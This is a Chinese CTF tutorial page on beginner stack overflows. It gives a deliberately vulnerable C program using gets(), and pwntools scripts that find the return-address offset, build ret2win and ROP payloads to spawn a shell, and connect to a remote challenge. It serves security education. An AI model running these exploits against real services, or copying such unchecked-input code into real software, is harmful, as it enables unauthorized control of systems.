---
title: 栈溢出入门
order: 2
icon: mdi:layers-outline
category:
  - CTF
  - 手册
  - Pwn
---

栈溢出是 Pwn 方向最经典的漏洞。一句话解释：**往一个固定大小的数组里塞了太多东西，多出来的数据覆盖了相邻的栈数据——包括函数的返回地址。**

## 先理解栈

函数调用时，CPU 在栈上保存两样东西：

```
高地址  +------------------+
        | 函数参数          |
        | 返回地址          |  ← 覆盖它，就能劫持程序控制流
        | 旧的 rbp         |
        | 局部变量 buf[16]  |  ← 溢出起点
低地址  +------------------+
```

当函数执行完 `ret` 时，CPU 从栈上弹出返回地址并跳过去。如果你能控制这个返回地址，你就能让程序执行任意代码。

## 最简单的栈溢出

```c
// gcc -fno-stack-protector -no-pie -o vuln vuln.c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");   // 目标：跳到这个函数
}

void vuln() {
    char buf[16];
    gets(buf);           // gets 不检查长度，危险！
}

int main() {
    vuln();
    return 0;
}
```

`gets(buf)` 会一直读输入直到换行，完全不关心 `buf` 只有 16 字节。你输入 100 个 `A` 它也会全塞进去。

## 第一步：找偏移量

用 pwntools 的 `cyclic` 生成一个不重复的字符串，输入给程序，程序崩溃后看 RIP 的值：

```python
from pwn import *

# 生成 100 字节的不重复字符串
print(cyclic(100).decode())
# aaaabaaacaaadaaaeaaafaaagaaahaaa...
```

在 GDB 里运行程序，输入这串字符，崩溃后：

```bash
gdb ./vuln
r
# 输入 cyclic 生成的字符串
# 崩溃后 pwndbg 会显示 RIP 的值，比如 0x61616174
```

然后算偏移量：

```python
cyclic_find(0x61616174)  # 得到偏移量，比如 24
```

## 第二步：构造 Payload

```python
from pwn import *

elf = ELF('./vuln')
win_addr = elf.symbols['win']  # 自动读取 win() 的地址

offset = 24  # 上一步得到的偏移量
payload = b'A' * offset + p64(win_addr)

p = process('./vuln')
p.sendline(payload)
p.interactive()  # 拿到 shell！
```

## ROP 链：没有 win() 怎么办

如果程序里没有 `win()` 函数，需要用 ROP（返回导向编程）。

程序代码里散落着以 `ret` 结尾的指令片段（叫 gadget），把它们串起来，相当于构造了一段新代码。

**目标：调用 `system("/bin/sh")`**

需要三样东西：
1. `pop rdi; ret` gadget — 把 "/bin/sh" 地址放进 rdi（第一个参数）
2. "/bin/sh" 字符串的地址
3. `system()` 函数的地址

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh  = next(elf.search(b'/bin/sh'))
system  = elf.plt['system']

payload = b'A' * offset
payload += p64(pop_rdi)   # pop rdi; ret
payload += p64(bin_sh)    # rdi = "/bin/sh"
payload += p64(system)    # system("/bin/sh")

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

::: tip 栈对齐问题
在 64 位程序里，调用 `system()` 前栈必须 16 字节对齐。如果 shell 没弹出来，在 payload 里 `system` 地址前加一个 `ret` gadget：
```python
ret = rop.find_gadget(['ret'])[0]
payload += p64(ret)       # 对齐用
payload += p64(system)
```
:::

## 完整 Pwntools 模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'  # 调试时开，提交时关

elf = ELF('./vuln')

# p = process('./vuln')        # 本地调试
p = remote('host', 12345)      # 远程连接

# 接收提示信息
p.recvuntil(b'Input: ')

# 构造 payload
offset = 24
payload = b'A' * offset + p64(elf.symbols['win'])

p.sendline(payload)
p.interactive()
```

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [溢出第一步](http://172.16.173.140/training/11?challenge=48) — 64 位程序无保护，有 gets() 和 win()，经典的 ret2win

## 练手资源

- CTFHub Pwn 技能树（从 ret2text 开始，一步一步来）
- 攻防世界 Pwn 新手区
- 自己用上面的 C 代码编译一个程序，亲手打一次
